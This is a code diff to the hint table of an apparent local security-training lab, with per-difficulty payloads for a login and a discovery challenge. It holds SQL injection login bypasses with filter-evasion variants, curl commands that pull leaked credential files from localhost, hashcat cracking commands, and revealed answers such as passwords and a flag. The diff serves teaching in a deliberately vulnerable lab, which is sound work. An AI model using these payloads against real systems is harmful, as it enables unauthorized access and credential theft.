@@ -230,9 +230,9 @@ function setLvl(card,lvl){
 PAYLOADS.login={easy:{p:"admin'-- -",n:"Easy — comment out the password check."},medium:{p:"admin' or '1'='1",n:"Medium — comments stripped -> self-closing OR (no comment)."},hard:{p:"admin' oorr '1'='1",n:"Hard — 'or' also stripped -> nest it (oorr -> or)."},expert:{p:"admin'/**/oorr/**/'1'='1",n:"Expert — spaces also stripped -> /**/ as spaces."}};
 PAYLOADS.disc={
  easy:{p:"curl -s http://localhost:8000/config.php.bak      # or open it + View Source (Ctrl+U)",n:"Easy — a config BACKUP (.bak) left in the web root (robots.txt lists it). Holds the admin password in PLAINTEXT + FLAG{c0nfig_backup_left_in_webroot}."},
- medium:{p:"curl -s http://localhost:8000/private/legacy_creds.b64 | base64 -d",n:"Medium — the deployment notes (reached via /.well-known/security.txt) point into /private/. A legacy file holds the credential BASE64-encoded — decode it."},
- hard:{p:"# grab the hash from the leaked user dump, identify, then crack:\nhashid '<hash>'    #  -> SHA-1\nhashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt",n:"Hard — a pre-migration user dump in /private/ exposes an UNSALTED hash. Identify it (hashid), crack with rockyou."},
- expert:{p:"# the old backup stores hash:salt  = md5(password + salt):\nhashcat -m 10 hash.txt /usr/share/wordlists/rockyou.txt   # feed one 'hash:salt' line",n:"Expert — an older backup stores the password SALTED. Dump the hash AND its salt, then crack with the matching mode (md5(pass.salt) = -m 10)."}
+ medium:{p:"curl -s http://localhost:8000/private/creds_medium.b64 | base64 -d",n:"Medium — /private/ has no directory listing; the deployment notes name the files. creds_medium.b64 holds the login BASE64-encoded — decode it → admin:Sup3rStaging!99."},
+ hard:{p:"curl -s http://localhost:8000/private/creds_hard.txt        # admin:<sha1>\nhashid '<sha1>'   # SHA-1 ->\nhashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt",n:"Hard — creds_hard.txt leaks an UNSALTED SHA-1. Identify it (hashid), crack with rockyou → chocolate."},
+ expert:{p:"curl -s http://localhost:8000/private/creds_expert.txt     # admin:<md5>:<salt>\nhashcat -m 10 hash.txt /usr/share/wordlists/rockyou.txt    # feed one 'hash:salt' line",n:"Expert — creds_expert.txt stores the password SALTED (md5(pass+salt), hash:salt). Crack with the matching mode -m 10 → liverpool."}
 };
 ['q','cmd','pg','gb','id','up','login','disc'].forEach(function(c){ setLvl(c,'easy'); });
 _ready=true;
